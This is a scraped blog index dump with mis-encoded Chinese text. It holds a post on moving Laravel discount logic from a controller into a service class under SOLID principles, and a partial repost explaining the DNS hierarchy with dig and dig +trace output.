app\\Controllers\\UserController.phpï¼š 123456789101112131415161718public function index(Request $request)&#123; $number = $request-&gt;input('number'); $price = 500; $discount = 1; if ($number == 1) &#123; $discount = 1; &#125; elseif ($number == 2) &#123; $discount = 0.9; &#125; elseif ($number == 3) &#123; $discount = 0.8; &#125; else &#123; $discount = 0.7; &#125; $total = $price * $number * $discount; return $total;&#125; åœ¨ä¸­å¤§å‹é¡¹ç›®ä¸­ï¼Œä¼šæœ‰å‡ ä¸ªé—®é¢˜ï¼š å°† PHP å†™çš„ä¸šåŠ¡é€»è¾‘ç›´æ¥å†™åœ¨ Controller ï¼Œé€ æˆ Controller çš„ä»£ç è‡ƒè‚¿éš¾ä»¥ç»´æŠ¤ è¿åäº† SOLID çš„å•ä¸€èŒè´£åŸåˆ™ï¼šä¸šåŠ¡é€»è¾‘ä¸åº”è¯¥å†™åœ¨ Controller è¿åäº† SOLID çš„å•ä¸€èŒè´£åŸåˆ™ï¼šè‹¥æœªæ¥æƒ³è¦æ”¹å˜æŠ˜æ‰£çš„å†™ç®—æ³•ï¼Œéƒ½éœ€è¦ç”¨åˆ°æ­¤ Methodï¼Œä¹Ÿä¹Ÿå°±æ˜¯è¯´è¿™ä¸ª Method åŒæ—¶åŒ…å«äº†è®¡ç®—æŠ˜æ‰£äºè®¡ç®—åŠ æ€»çš„èŒè´£ï¼Œå› æ­¤è¿åäº† SOLID çš„å•ä¸€èŒè´£åŸåˆ™ ç›´æ¥å†™åœ¨ Controller çš„é€»è¾‘æ— æ³•è¢«å…¶ä»– Controller ä½¿ç”¨ app\\Services\\OrderService.phpï¼š 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748&lt;?phpnamespace App\\Services;/** * Class OrderService * * @package App\\Services */class OrderService&#123; /** * è®¡ç®—æŠ˜æ‰£ * * @param $number * * @return float */ public function getDisCount($number) &#123; switch ($number) &#123; case 1: return 1.0; break; case 2: return 0.9; break; case 3: return 0.8; break; default: return 0.7; &#125; &#125; /** * è®¡ç®—æœ€åä»·æ ¼ * * @param $number * @param $discount * * @return int */ public function getTotal($number, $discount) &#123; return 500 * $number * $discount; &#125;&#125; åœ¨ Controller ä¸­è°ƒç”¨ä»£ç ï¼Œå¦‚ä¸‹ï¼š 1234567891011121314151617181920212223242526272829303132333435363738394041&lt;?phpnamespace App\\Http\\Controllers;use App\\Services\\OrderService;use Illuminate\\Http\\Request;/** * Class UserController * * @package App\\Http\\Controllers */class UserController extends Controller&#123; /** * @var \\App\\Services\\EmailService */ protected $orderService; /** * UserController constructor. * * @param \\App\\Services\\OrderService $orderService */ public function __construct(OrderService $orderService) &#123; $this-&gt;orderService = $orderService; &#125; /** * @param \\Illuminate\\Http\\Request $request * * @return int */ public function index(Request $request) &#123; $number = $request-&gt;input('number'); $discount = $this-&gt;orderService-&gt;getDisCount($number); return $this-&gt;orderService-&gt;getTotal($number, $discount); &#125;&#125; å°†åŸæœ¬çš„ if () { .. } else { .. } é€»è¾‘æ”¹å†™æˆä½¿ç”¨ OrderServiceï¼ŒController å˜å¾—éå¸¸å¹²å‡€ï¼Œä¹Ÿè¾¾æˆåŸæ¥ Controlleræ¥å— Http Requestï¼Œè°ƒç”¨å…¶ä»– Class çš„è´£ä»»ã€‚ æ”¹ç”¨è¿™ç§å†™æ³•çš„å‡ ä¸ªä¼˜ç‚¹ï¼š å°† PHP å†™çš„ä¸šåŠ¡é€»è¾‘å†™åœ¨ Service ï¼Œè§£å†³äº† Controller ä»£ç è‡ƒè‚¿çš„é—®é¢˜ ç¬¦åˆ SOLID çš„å•ä¸€èŒè´£åŸåˆ™ï¼š ä¸šåŠ¡é€»è¾‘å†™åœ¨ Serviceï¼Œæ²¡å†™åœ¨ Controller ç¬¦åˆ SOLID çš„å•ä¸€èŒè´£åŸåˆ™ï¼šè®¡ç®—æŠ˜æ‰£ä¸è®¡ç®—åŠ æ€»åˆ†å¼€åœ¨ä¸åŒçš„ Methodï¼Œä¸”å½’å±äº OrderServiceï¼Œè€Œé Controller ç¬¦åˆ SOLID çš„ä¾èµ–åè½¬åŸåˆ™ï¼š Controller å¹¶éç›´æ¥ç›¸ä¾äº Serviceï¼Œè€Œæ˜¯å°† Service ä¾èµ–æ³¨å…¥è¿› Controller å…¶ä»– Controller ä¹Ÿå¯ä»¥é‡å¤ä½¿ç”¨è¿™æ®µä¸šåŠ¡é€»è¾‘ æ€»ç»“ å®é™…ä¸Šä¼šæœ‰å¾ˆå¤š Service ï¼Œéœ€è¦è‡ªè¡Œä¾ç…§ SOLID åŸåˆ™å»åˆ¤æ–­æ˜¯å¦è¯¥å»ºç«‹ Service Service ä½¿å¾—ä¸šåŠ¡é€»è¾‘ä» Controller ä¸­è§£æ”¾ï¼Œä¸ä»…æ›´å®¹æ˜“ç»´æŠ¤ã€æ›´å®¹æ˜“æ‹“å±•ã€æ›´å®¹æ˜“é‡å¤ä½¿ç”¨ä¸”æ›´å®¹æ˜“æµ‹è¯• åŸæ–‡é“¾æ¥ å¦‚ä½•ä½¿ç”¨Serviceï¼Ÿ å¦‚ä½•ä½¿ç”¨ Service æ¨¡å¼? é¡¹ç›®åœ°å€","categories":[{"name":"PHP","slug":"PHP","permalink":"https://www.0x2beace.com/categories/PHP/"},{"name":"Laravel","slug":"PHP/Laravel","permalink":"https://www.0x2beace.com/categories/PHP/Laravel/"}],"tags":[{"name":"PHP","slug":"PHP","permalink":"https://www.0x2beace.com/tags/PHP/"},{"name":"Laravel","slug":"Laravel","permalink":"https://www.0x2beace.com/tags/Laravel/"}]},{"title":"ã€è½¬è½½ã€åŸŸåèƒŒåé‚£äº›äº‹","slug":"those-things-behind-the-domain-name","date":"2021-04-11T07:14:30.000Z","updated":"2021-04-11T07:16:33.330Z","comments":true,"path":"those-things-behind-the-domain-name/","link":"","permalink":"https://www.0x2beace.com/those-things-behind-the-domain-name/","excerpt":"äº’è”ç½‘ä¸­çš„åœ°å€æ˜¯æ•°å­—çš„ IP åœ°å€ï¼Œä¾‹å¦‚61.135.169.125å°±æ˜¯ç™¾åº¦çš„å®˜ç½‘åœ°å€ä¹‹ä¸€ï¼Œå¦‚æœæ¯æ¬¡è®¿é—®ç™¾åº¦éƒ½éœ€è¦è¾“å…¥ IP çš„è¯ï¼Œä¼°è®¡åˆ°ä»Šå¤©äº’è”ç½‘éƒ½è¿˜æ²¡æœ‰èµ°å‡ºé¸¿è’™é˜¶æ®µã€‚","text":"äº’è”ç½‘ä¸­çš„åœ°å€æ˜¯æ•°å­—çš„ IP åœ°å€ï¼Œä¾‹å¦‚61.135.169.125å°±æ˜¯ç™¾åº¦çš„å®˜ç½‘åœ°å€ä¹‹ä¸€ï¼Œå¦‚æœæ¯æ¬¡è®¿é—®ç™¾åº¦éƒ½éœ€è¦è¾“å…¥ IP çš„è¯ï¼Œä¼°è®¡åˆ°ä»Šå¤©äº’è”ç½‘éƒ½è¿˜æ²¡æœ‰èµ°å‡ºé¸¿è’™é˜¶æ®µã€‚ åœ¨ç½‘ç»œå‘å±•å†å²ä¸Šï¼Œæœ€å¼€å§‹ç¡®å®å°±æ˜¯ç›´æ¥ä½¿ç”¨ IP åœ°å€æ¥è®¿é—®è¿œç¨‹ä¸»æœºçš„ã€‚æ—©æœŸè”ç½‘çš„æ¯å°è®¡ç®—æœºéƒ½æ˜¯é‡‡ç”¨ä¸»æœºæ–‡ä»¶ï¼ˆå³æˆ‘ä»¬ä¿—ç§°çš„ hosts æ–‡ä»¶ï¼‰æ¥è¿›è¡Œåœ°å€é…ç½®å’Œè§£æçš„ï¼Œåæ¥è”ç½‘æœºå™¨è¶Šæ¥è¶Šå¤šï¼Œä¸»æœºæ–‡ä»¶çš„æ›´æ–°å’ŒåŒæ­¥å°±æˆäº†å¾ˆå¤§çš„é—®é¢˜ã€‚äºæ˜¯ï¼Œ1983 å¹´ä¿ç½—Â·è«å¡æ´¾ä¹”æ–¯å‘æ˜äº†åŸŸåè§£ææœåŠ¡å’ŒåŸŸåç³»ç»Ÿï¼Œåœ¨ 1985 å¹´ 1 æœˆ 1 æ—¥ï¼Œä¸–ç•Œä¸Šç¬¬ä¸€ä¸ªåŸŸå nordu.net æ‰è¢«æ³¨å†ŒæˆåŠŸã€‚ åŸŸåæ¯” IP åœ°å€æ›´å®¹æ˜“è®°å¿†ï¼Œæœ¬è´¨ä¸Šåªæ˜¯ä¸ºæ•°å­—åŒ–çš„äº’è”ç½‘èµ„æºæä¾›äº†æ˜“äºè®°å¿†çš„åˆ«åï¼Œå°±åƒåœ¨åŒ—äº¬æèµ·ã€Œæ•…å®«åšç‰©é™¢ã€å°±éƒ½çŸ¥é“æŒ‡çš„æ˜¯ã€Œä¸œåŸåŒºæ™¯å±±å‰è¡— 4 å·ã€çš„é‚£ä¸ªå¤§é™¢å­ä¸€æ ·ã€‚å¦‚æœæŠŠ IP åœ°å€çœ‹æˆç”µè¯å·ç ï¼Œé‚£åŸŸåç³»ç»Ÿå°±æ˜¯é€šè®¯å½•ã€‚æˆ‘ä»¬åœ¨é€šè®¯å½•é‡Œä¿å­˜äº†æœ‹å‹å’Œå®¶äººçš„ä¿¡æ¯ï¼Œæ¯æ¬¡é€šè¿‡åå­—æ‰¾åˆ°æŸäººæ‰“ç”µè¯çš„æ—¶å€™ï¼Œé€šè®¯å½•å°±ä¼šæŸ¥å‡ºä¸ä¹‹å…³è”çš„ç”µè¯å·ç ï¼Œç„¶åæ‹¨å·è¿‡å»ã€‚æˆ‘ä»¬å¯èƒ½è®°ä¸ä¸‹å¤šå°‘å®Œæ•´çš„ç”µè¯å·ç ï¼Œä½†æ˜¯è”ç³»äººçš„åå­—å´æ˜¯ä¸€å®šè®°å¾—çš„ã€‚ æ—¢ç„¶ã€ŒåŸŸåã€åªæ˜¯ä¸€ä¸ªåˆ«åï¼Œå•å‡­è¿™ä¸€ä¸ªåå­—æˆ‘ä»¬å¹¶ä¸èƒ½è®¿é—®åˆ°æ­£ç¡®çš„åœ°å€ï¼Œåªæœ‰èƒ½å°†åŸŸåè§£ææˆå®é™…çš„ç½‘ç»œåœ°å€ï¼Œç½‘ç»œè®¿é—®æ‰èƒ½æˆåŠŸã€‚è¿™ç§è§£æå·¥ä½œç”±ä¸“é—¨çš„ã€ŒåŸŸåç³»ç»Ÿã€ï¼ˆDomain Name Systemï¼Œç®€ç§° DNSï¼‰å®Œæˆï¼ŒDNS ä¹Ÿæ˜¯äº’è”ç½‘çš„æ ¸å¿ƒåŸºç¡€æœåŠ¡ä¹‹ä¸€ã€‚ åŸŸåè§£ææ˜¯æ€ä¹ˆå®Œæˆçš„DNS è§£æçš„è¿‡ç¨‹æ˜¯ä»€ä¹ˆæ ·å­çš„å‘¢ï¼Ÿåœ¨å¼€å§‹è¿™ä¸ªé—®é¢˜ä¹‹å‰ï¼Œæˆ‘ä»¬å…ˆçœ‹ä¸€çœ‹åŸŸåçš„å±‚æ¬¡ç»“æ„ã€‚ åŸŸåçš„å±‚çº§ç»“æ„åœ¨è®¨è®ºåŸŸåçš„æ—¶å€™ï¼Œæˆ‘ä»¬ç»å¸¸å¬åˆ°æœ‰äººè¯´ã€Œé¡¶çº§åŸŸåã€ã€ã€Œä¸€çº§åŸŸåã€ã€ã€ŒäºŒçº§åŸŸåã€ç­‰æ¦‚å¿µï¼ŒåŸŸåçº§åˆ«ç©¶ç«Ÿæ˜¯æ€ä¹ˆåˆ’åˆ†çš„å‘¢ï¼Ÿ æ ¹åŸŸåã€‚è¿˜æ˜¯ä»¥ç™¾åº¦ä¸ºä¾‹ï¼Œé€šè¿‡ä¸€äº›åŸŸåè§£æå·¥å…·ï¼Œæˆ‘ä»¬å¯ä»¥çœ‹åˆ°ç™¾åº¦å®˜ç½‘åŸŸåæ˜¾ç¤ºä¸º www.baidu.com.ï¼Œç»†å¿ƒçš„äººä¼šæ³¨æ„åˆ°ï¼Œè¿™é‡Œæœ€åæœ‰ä¸€ä¸ª .ï¼Œè¿™ä¸æ˜¯ bugï¼Œè€Œæ˜¯æ‰€æœ‰åŸŸåçš„å°¾éƒ¨éƒ½æœ‰ä¸€ä¸ªæ ¹åŸŸåã€‚www.baidu.com çœŸæ­£çš„åŸŸåæ˜¯ www.baidu.com.rootï¼Œç®€å†™ä¸ºwww.baidu.com.ï¼Œåˆå› ä¸ºæ ¹åŸŸå .rootå¯¹äºæ‰€æœ‰åŸŸåéƒ½æ˜¯ä¸€æ ·çš„ï¼Œæ‰€ä»¥å¹³æ—¶æ˜¯çœç•¥çš„ï¼Œæœ€ç»ˆå°±å˜æˆäº†æˆ‘ä»¬å¸¸è§çš„æ ·å­ã€‚ æ ¹åŸŸåçš„ä¸‹ä¸€çº§å«åšé¡¶çº§åŸŸåï¼ˆtop-level domainï¼Œç¼©å†™ä¸º TLDï¼‰ï¼Œä¹Ÿå«åšä¸€çº§åŸŸåï¼Œå¸¸è§çš„å¦‚ .com/ã€.net/ã€.org/ã€.cn/ ç­‰ç­‰ï¼Œä»–ä»¬å°±æ˜¯é¡¶çº§åŸŸåã€‚ å†ä¸‹ä¸€çº§å«åšäºŒçº§åŸŸåï¼ˆsecond-level domainï¼Œç¼©å†™ä¸º SLDï¼‰ï¼Œæ¯”å¦‚ baidu.comã€‚è¿™æ˜¯æˆ‘ä»¬èƒ½å¤Ÿè´­ä¹°å’Œæ³¨å†Œçš„æœ€é«˜çº§åŸŸåã€‚æ¬¡çº§åŸŸåä¹‹ä¸‹ï¼Œå°±æ˜¯ä¸»æœºåï¼ˆhostï¼‰ï¼Œä¹Ÿå¯ä»¥ç§°ä¸ºä¸‰çº§åŸŸåï¼Œæ¯”å¦‚ www.baidu.comï¼Œç”±æ­¤å¾€ä¸‹ï¼ŒåŸºæœ¬ä¸Š N çº§åŸŸåå°±æ˜¯åœ¨ N-1 çº§åŸŸåå‰è¿½åŠ ä¸€çº§ã€‚ æ€»ç»“ä¸€ä¸‹ï¼Œå¸¸è§çš„åŸŸåå±‚çº§ç»“æ„å¦‚ä¸‹ï¼š 12ä¸»æœºå.æ¬¡çº§åŸŸå.é¡¶çº§åŸŸå.æ ¹åŸŸåwww.baidu.com.root ä¸€èˆ¬æ¥è¯´æˆ‘ä»¬è´­ä¹°ä¸€ä¸ªåŸŸåå°±æ˜¯è´­ä¹°ä¸€ä¸ªäºŒçº§åŸŸåï¼ˆSLDï¼‰çš„ç®¡ç†æƒï¼ˆå¦‚ 0x2beace.comï¼‰ï¼Œæœ‰äº†è¿™ä¸ªç®¡ç†æƒæˆ‘ä»¬å°±å¯ä»¥éšæ„è®¾ç½®ä¸‰çº§ã€å››çº§åŸŸåäº†ã€‚ åŸŸåè§£æçš„è¿‡ç¨‹ä¸åŸŸåçš„åˆ†çº§ç»“æ„å¯¹åº”ï¼ŒDNS ç³»ç»Ÿä¹Ÿæ˜¯ä¸€ä¸ªæ ‘çŠ¶ç»“æ„ï¼Œä¸åŒçº§åˆ«çš„åŸŸåç”±ä¸åŒçš„åŸŸåæœåŠ¡å™¨æ¥è§£æï¼Œæ•´ä¸ªè¿‡ç¨‹æ˜¯ä¸€ä¸ªã€Œå±‚çº§å¼ã€çš„ã€‚ å±‚çº§å¼åŸŸåè§£æä½“ç³»çš„ç¬¬ä¸€å±‚å°±æ˜¯æ ¹åŸŸåæœåŠ¡å™¨ï¼Œå…¨ä¸–ç•Œ IPv4 æ ¹åŸŸåæœåŠ¡å™¨åªæœ‰ 13 å°ï¼ˆåå­—åˆ†åˆ«ä¸º A è‡³ Mï¼‰ï¼Œ1 ä¸ªä¸ºä¸»æ ¹æœåŠ¡å™¨åœ¨ç¾å›½ï¼Œå…¶ä½™ 12 ä¸ªå‡ä¸ºè¾…æ ¹æœåŠ¡å™¨ï¼Œå®ƒä»¬è´Ÿè´£ç®¡ç†ä¸–ç•Œå„å›½çš„åŸŸåä¿¡æ¯ã€‚åœ¨æ ¹æœåŠ¡å™¨ä¸‹é¢æ˜¯é¡¶çº§åŸŸåæœåŠ¡å™¨ï¼Œå³ç›¸å…³å›½å®¶åŸŸåç®¡ç†æœºæ„çš„æ•°æ®åº“ï¼Œå¦‚ä¸­å›½äº’è”ç½‘ç»œä¿¡æ¯ä¸­å¿ƒï¼ˆCNNICï¼‰ã€‚ç„¶åæ˜¯å†ä¸‹ä¸€çº§çš„æƒå¨åŸŸåæœåŠ¡å™¨å’Œ ISP çš„ç¼“å­˜æœåŠ¡å™¨ã€‚ ä¸€ä¸ªåŸŸåå¿…é¡»é¦–å…ˆç»è¿‡æ ¹æ•°æ®åº“çš„è§£æåï¼Œæ‰èƒ½è½¬åˆ°é¡¶çº§åŸŸåæœåŠ¡å™¨è¿›è¡Œè§£æï¼Œè¿™ä¸€ç‚¹ä¸ç”Ÿæ´»ä¸­é—®è·¯çš„æƒ…å½¢æœ‰å‡ åˆ†ç›¸ä¼¼ã€‚ å‡è®¾åŒ—äº¬å¸‚è®¾ç«‹äº†ä¸€ä¸ªä¸“é—¨çš„ã€Œé“è·¯å’¨è¯¢å±€ã€ï¼Œé‡Œé¢è®¾ç½®äº†å±€é•¿ã€éƒ¨é•¿ã€å¤„é•¿ã€ç§‘å‘˜å¥½å‡ ä¸ªçº§åˆ«çš„å…¬åŠ¡å‘˜ï¼Œä¸åŒçš„éƒ¨é—¨ã€ç§‘å®¤ã€äººå‘˜è´Ÿè´£è§£ç­”ä¸åŒåŒºåŸŸçš„é“è·¯é—®é¢˜ã€‚è¿™é‡Œçš„äººéƒ½æœ‰ä¸€ä¸ªå…±åŒç‰¹ç‚¹ï¼Œä¿¡å¥‰ã€Œå¥½è®°æ€§ä¸å¦‚çƒ‚ç¬”å¤´ã€çš„å“²ç†ï¼Œå–œæ¬¢å°†è‡ªå·±äº†è§£åˆ°çš„ä¿¡æ¯è®°å½•åˆ°ç¬”è®°æœ¬ä¸Šã€‚ä½†æ˜¯æœ‰ä¸€ç‚¹é—æ†¾çš„æ˜¯ï¼Œä»–ä»¬å†™å­—ç”¨çš„å¢¨æ°´åªæœ‰ä¸€ç§ï¼Œå«ã€Œé­”æœ¯å¢¨æ°´ã€ï¼Œåˆå†™å­—è¿¹æµ“åšï¼Œä¹‹åä¼šæ…¢æ…¢å˜æ·¡ï¼Œ1 å°æ—¶ä¹‹ååˆ™ä¼šå®Œå…¨æ¶ˆå¤±ã€‚é“è·¯å’¨è¯¢å±€é—¨å£è¿˜æœ‰ä¸€ä¸ªé—¨å«å¤§çˆ·ï¼Œæ‰€æœ‰çš„äººè¦é—®è·¯éƒ½éœ€è¦é€šè¿‡ä»–æ¥ä¼ è¾¾å’Œå›å¤ï¼Œå¸‚æ°‘å¹¶ä¸èƒ½è¿›å…¥åŠå…¬æ¥¼ã€‚ å¦‚æœå¸‚æ°‘ A å…ˆç”Ÿæ¥æ‰¾é—¨å«å¤§çˆ·è¯¢é—®ã€ŒåŒ—æµ·å…¬å›­ã€çš„åœ°å€ï¼Œé—¨å«å¤§çˆ·ä¼šå…ˆçœ‹ä¸€ä¸‹è‡ªå·±çš„ç¬”è®°æœ¬ï¼Œæ‰¾æ‰¾çœ‹ä¹‹å‰æœ‰æ²¡æœ‰äººé—®è¿‡åŒ—æµ·å…¬å›­ï¼Œå¦‚æœæ²¡æœ‰ï¼Œä»–å°±ä¼šæ‹¨æ‰“å†…çº¿å»æ‰¾å±€é•¿æ±‚åŠ©ã€‚å±€é•¿è¯´åŒ—æµ·æ˜¯è¥¿åŸåŒºï¼Œä½ å»é—®è´Ÿè´£è¥¿åŸåŒºé“è·¯ä¿¡æ¯çš„èµµéƒ¨é•¿å§ã€‚é—¨å«å¤§çˆ·åˆå»é—®èµµéƒ¨é•¿ï¼Œèµµéƒ¨é•¿æŸ¥äº†ä¸€ä¸‹ï¼Œè¯´è¿™ä¸ªåœ°å€ä½ å»é—®è´Ÿè´£æ ¸å¿ƒåŒºçš„é’±å¤„é•¿å§ã€‚é—¨å«å¤§çˆ·åˆç»™é’±å¤„é•¿æ‰“è¿‡å»ç”µè¯ï¼Œé’±å¤„é•¿è¯´è¿™ä¸ªåœ°å€æˆ‘ä¹Ÿä¸æŒæ¡å•Šï¼Œä½ å»é—®ä¸€ä¸‹è´Ÿè´£æ™¯å±±ç‰‡åŒºçš„ç§‘å‘˜å°å­™å§ã€‚é—¨å«å¤§çˆ·ä»å°å­™é‚£é‡Œç»ˆäºçŸ¥é“äº†åŒ—æµ·å…¬å›­åœ°å€ï¼Œä»–èµ¶ç´§è®°åˆ°è‡ªå·±çš„å°æœ¬æœ¬ä¸Šï¼Œç„¶åæŠŠç»“æœå‘Šè¯‰äº†å¸‚æ°‘ A å…ˆç”Ÿã€‚æ¥ä¸‹æ¥ä¸€å°æ—¶å†…ï¼Œå¦‚æœè¿˜æœ‰å¸‚æ°‘ B å…ˆç”Ÿå†æ¥é—®åŒ—æµ·å…¬å›­çš„è¯ï¼Œé—¨å«å¤§çˆ·å°±ç›´æ¥ç”¨ç¬”è®°æœ¬ä¸Šè®°è½½çš„ç»“æœå›å¤äº†ã€‚å½“ç„¶ï¼Œå¦‚æœå¸‚æ°‘ C å¥³å£«è¿‡æ¥é—®åˆ«çš„åœ°å€çš„è¯ï¼Œé—¨å«å¤§çˆ·å°±è¦æŠŠå¤„ç† A å…ˆç”Ÿé—®è¯¢çš„æµç¨‹å†èµ°ä¸€éäº†ã€‚ åˆ†çº§æŸ¥è¯¢çš„å®ä¾‹ç°åœ¨æˆ‘ä»¬æ¥çœ‹ä¸€ä¸ªå®é™…çš„ä¾‹å­ã€‚å¦‚æœæˆ‘ä»¬åœ¨æµè§ˆå™¨ä¸­è¾“å…¥https://news.qq.comï¼Œé‚£æµè§ˆå™¨ä¼šä»æ¥æ”¶åˆ°çš„ URL ä¸­æŠ½å–å‡ºåŸŸåå­—æ®µï¼ˆnews.qq.comï¼‰ï¼Œç„¶åå°†å®ƒä¼ ç»™ DNS å®¢æˆ·ç«¯ï¼ˆæ“ä½œç³»ç»Ÿæä¾›ï¼‰æ¥è§£æã€‚ é¦–å…ˆæˆ‘ä»¬è¯´æ˜ä¸€ä¸‹æœ¬æœº DNS é…ç½®ï¼ˆå°±æ˜¯ /etc/resolv.conf æ–‡ä»¶ï¼Œé‡Œé¢æŒ‡å®šäº†æœ¬åœ° DNS æœåŠ¡å™¨çš„åœ°å€ï¼ŒWindows ç³»ç»Ÿå¯èƒ½ä¼šæœ‰æ‰€ä¸åŒï¼‰ï¼š 123$ cat /etc/resolv.conf nameserver 202.106.0.20nameserver 202.106.196.115 ç„¶åæˆ‘ä»¬ç”¨ dig è¿™ä¸ªå·¥å…·æŸ¥çœ‹ä¸€ä¸‹ news.qq.com çš„è§£æç»“æœï¼ˆå…¶ä¸­ä¸­æ–‡éƒ¨åˆ†æ˜¯è§£é‡Šè¯´æ˜ï¼‰ï¼š 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748$ dig news.qq.com; &lt;&lt;&gt;&gt; DiG 9.10.6 &lt;&lt;&gt;&gt; news.qq.comè¿™æ˜¯ dig ç¨‹åºçš„ç‰ˆæœ¬å·ä¸è¦æŸ¥è¯¢çš„åŸŸå;; global options: +cmd;; Got answer:ä»¥ä¸‹æ˜¯è¦è·å–çš„å†…å®¹ã€‚;; -&gt;&gt;HEADER&lt;&lt;- opcode: QUERY, status: NOERROR, id: 47559;; flags: qr rd ra; QUERY: 1, ANSWER: 2, AUTHORITY: 0, ADDITIONAL: 0è¿™ä¸ªæ˜¯è¿”å›åº”ç­”çš„å¤´éƒ¨ä¿¡æ¯ï¼š1. opcodeï¼šæ“ä½œç ï¼ŒQUERY ä»£è¡¨æŸ¥è¯¢æ“ä½œï¼›2. status: çŠ¶æ€ï¼ŒNOERROR ä»£è¡¨æ²¡æœ‰é”™è¯¯;3. idï¼šç¼–å·ï¼Œåœ¨ DNS åè®®ä¸­é€šè¿‡ç¼–å·åŒ¹é…è¿”å›å’ŒæŸ¥è¯¢ï¼›4. flags: æ ‡å¿—ï¼Œå«ä¹‰å¦‚ä¸‹: - qrï¼šqueryï¼ŒæŸ¥è¯¢æ ‡å¿—ï¼Œä»£è¡¨æ˜¯æŸ¥è¯¢æ“ä½œ - rdï¼šrecursion desiredï¼Œä»£è¡¨å¸Œæœ›è¿›è¡Œé€’å½’æŸ¥è¯¢æ“ä½œ; - raï¼šrecursive availableï¼Œä»£è¡¨æŸ¥è¯¢çš„æœåŠ¡å™¨æ”¯æŒé€’å½’æŸ¥è¯¢æ“ä½œ;5. QUERY æŸ¥è¯¢æ•°ï¼Œä¸ä¸‹é¢ QUESTION SECTION çš„è®°å½•æ•°ä¸€ä¸€å¯¹åº”ï¼›6. ANSWER ç»“æœæ•°ï¼Œä¸ä¸‹é¢çš„ ANSWER SECTION çš„è®°å½•æ•°ä¸€ä¸€å¯¹åº”ï¼›7. AUTHORITY æƒå¨å›å¤æ•°ï¼Œå¦‚æœæŸ¥è¯¢ç»“æœç”±ç®¡ç†åŸŸåçš„åŸŸåæœåŠ¡å™¨è€Œä¸æ˜¯ç¼“å­˜æœåŠ¡å™¨æä¾›çš„ï¼Œåˆ™ç§°ä¸ºæƒå¨å›å¤ã€‚ 0 è¡¨ç¤ºæ‰€æœ‰ç»“æœéƒ½ä¸æ˜¯æƒå¨å›å¤ï¼›8. ADDITIONAL é¢å¤–è®°å½•æ•°ï¼›;; QUESTION SECTION:;news.qq.com. IN AæŸ¥è¯¢éƒ¨åˆ†,ä»å·¦åˆ°å³éƒ¨åˆ†æ„ä¹‰å¦‚ä¸‹:1ã€è¦æŸ¥è¯¢çš„åŸŸåï¼›2ã€è¦æŸ¥è¯¢ä¿¡æ¯çš„ç±»åˆ«ï¼ŒIN ä»£è¡¨ç±»åˆ«ä¸º IP åè®®ï¼Œå³ Internetã€‚3ã€æŸ¥è¯¢çš„è®°å½•ç±»å‹ï¼ŒA è®°å½•(Address)ä»£è¡¨è¦æŸ¥è¯¢ IPv4 åœ°å€ã€‚;; ANSWER SECTION:news.qq.com. 136 IN CNAME https.qq.com.https.qq.com. 476 IN A 125.39.52.26å›åº”éƒ¨åˆ†ï¼Œä»å·¦åˆ°å³å„éƒ¨åˆ†æ„ä¹‰ï¼š1ã€å¯¹åº”çš„åŸŸå2ã€TTLï¼Œtime to liveï¼Œç¼“å­˜æ—¶é—´ï¼Œå•ä½ç§’ï¼Œä»£è¡¨ç¼“å­˜åŸŸåæœåŠ¡å™¨å¯ä»¥åœ¨ç¼“å­˜ä¸­ä¿å­˜çš„æœŸé™ã€‚3ã€æŸ¥è¯¢ä¿¡æ¯çš„ç±»åˆ«4ã€æŸ¥è¯¢çš„è®°å½•ç±»å‹ï¼ŒCNAME è¡¨ç¤ºåˆ«åè®°å½•ï¼ŒA è®°å½•(Address)ä»£è¡¨ IPv4 åœ°å€ã€‚5ã€åŸŸåå¯¹åº”çš„ ip åœ°å€ã€‚;; Query time: 56 msec;; SERVER: 202.106.0.20#53(202.106.0.20)æŸ¥è¯¢ä½¿ç”¨çš„æœåŠ¡å™¨åœ°å€å’Œç«¯å£,å…¶å®å°±æ˜¯æœ¬åœ° DNS åŸŸåæœåŠ¡å™¨;; WHEN: Thu Jul 11 15:59:37 CST 2019;; MSG SIZE rcvd: 65æŸ¥è¯¢çš„æ—¶é—´ä¸å›åº”çš„å¤§å°ï¼Œæ”¶åˆ° 65 å­—èŠ‚çš„åº”ç­”æ•°æ®ã€‚ ä»è¿™ä¸ªåº”ç­”å¯ä»¥çœ‹åˆ°ï¼Œæˆ‘ä»¬å¾—åˆ°çš„ç»“æœä¸æ˜¯æƒå¨å›å¤ï¼Œåªæ˜¯æœ¬åœ° DNS æœåŠ¡å™¨ä»ç¼“å­˜ä¸­ç»™äº†åº”ç­”ã€‚ æ¥ä¸‹æ¥æˆ‘ä»¬åœ¨ dig å‘½ä»¤ä¸­å¢åŠ ä¸€ä¸ªå‚æ•° +traceï¼Œçœ‹çœ‹å®Œæ•´çš„åˆ†çº§æŸ¥è¯¢è¿‡ç¨‹ï¼š 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556$ dig +trace news.qq.com; &lt;&lt;&gt;&gt; DiG 9.10.6 &lt;&lt;&gt;&gt; +trace news.qq.com;; global options: +cmd. 432944 IN NS g.root-servers.net.. 432944 IN NS k.root-servers.net.. 432944 IN NS b.root-servers.net.. 432944 IN NS h.root-servers.net.. 432944 IN NS i.root-servers.net.. 432944 IN NS f.root-servers.net.. 432944 IN NS d.root-servers.net.. 432944 IN NS e.root-servers.net.. 432944 IN NS j.root-servers.net.. 432944 IN NS l.root-servers.net.. 432944 IN NS c.root-servers.net.. 432944 IN NS m.root-servers.net.. 432944 IN NS a.root-servers.net.;; Received 228 bytes from 202.106.0.20#53(202.106.0.20) in 45 msè¿™äº›å°±æ˜¯ç¥ç§˜çš„æ ¹åŸŸåæœåŠ¡å™¨ï¼Œç”±æœ¬åœ° DNS æœåŠ¡å™¨è¿”å›äº†æ‰€æœ‰æ ¹åŸŸåæœåŠ¡å™¨åœ°å€ã€‚com. 172800 IN NS g.gtld-servers.net.com. 172800 IN NS a.gtld-servers.net.com. 172800 IN NS b.gtld-servers.net.com. 172800 IN NS m.gtld-servers.net.com. 172800 IN NS d.gtld-servers.net.com. 172800 IN NS c.gtld-servers.net.com. 172800 IN NS j.gtld-servers.net.com. 172800 IN NS h.gtld-servers.net.com. 172800 IN NS f.gtld-servers.net.com. 172800 IN NS l.gtld-servers.net.com. 172800 IN NS e.gtld-servers.net.com. 172800 IN NS k.gtld-servers.net.com. 172800 IN NS i.gtld-servers.net.;; Received 1171 bytes from 192.36.148.17#53(i.root-servers.net) in 57 msè¿™é‡Œæ˜¾ç¤ºçš„æ˜¯ .com åŸŸåçš„ 13 æ¡ NS è®°å½•ï¼Œæœ¬åœ° DNS 